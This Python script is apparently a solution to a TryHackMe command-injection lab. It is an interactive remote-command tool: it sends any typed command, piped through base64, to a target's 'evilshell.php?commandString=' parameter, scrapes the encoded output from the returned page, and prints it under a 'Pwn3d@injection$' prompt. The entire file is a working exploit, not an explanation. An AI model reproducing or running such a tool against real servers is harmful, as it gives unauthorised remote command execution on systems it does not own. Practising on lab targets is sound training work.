import requests
from base64 import b64decode
import re
import sys

class bcolors:
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        FAIL = '\033[91m'
        LIGHTGREY='\033[37m'
        WARNING = '\033[93m'
        ORANGE='\033[33m'
        ENDC = '\033[0m'
try:
    IP_address = sys.argv[1]

    print (bcolors.LIGHTGREY + "\n\nINJECTION TryHackMe\n\n"+ bcolors.ENDC)
    def getoutput(user_input):
        global IP_address
        #url = "http://10.10.172.155/evilshell.php?commandString="
        url = f"http://{IP_address}/evilshell.php?commandString="
        command = " | base64 -w 0"
        cmd = user_input + command
        url = url + cmd
        sess = requests.session()
        stdout = sess.get(url, timeout=2).text
        b64 = re.search("</button>(.*?)</form>", stdout, re.DOTALL).group(1)
        output = b64decode(b64).strip()
        print (bcolors.OKGREEN + output.decode() + bcolors.ENDC)
        if not output:
            print (bcolors.WARNING + "Error" + bcolors.ENDC)
except:
    print (bcolors.ORANGE + "USAGE:\n\npython3 Day1_os_command_injection.py IPAddress\n\n" + bcolors.ENDC)
    sys.exit(1)

if __name__ == "__main__":
    while True:
        mine = input('Pwn3d@' + bcolors.FAIL + 'injection$ ' + bcolors.ENDC)
        if "exit" in mine:
            print (bcolors.FAIL + "\nGoodbye :( \n" + bcolors.ENDC)
            sys.exit(1)
        else:
            try:
                getoutput(mine)
            except requests.exceptions.Timeout:
                print (bcolors.FAIL + "\nThe Connection timeout out!\n\n\nPlease check the IP address then repeat the process" + bcolors.ENDC)
                sys.exit(1)